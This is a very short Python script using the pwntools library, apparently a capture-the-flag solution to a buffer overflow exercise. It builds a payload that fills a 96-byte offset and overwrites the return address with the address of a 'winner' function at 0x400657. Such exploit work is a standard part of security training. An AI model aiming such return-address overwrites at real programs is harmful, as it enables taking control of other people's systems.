from pwn import *

# winner addr 0x400657
#offset is 0x60 = 96
print(flat({96: b'\x57\x06\x40\x00'}))
# print('a'*96)
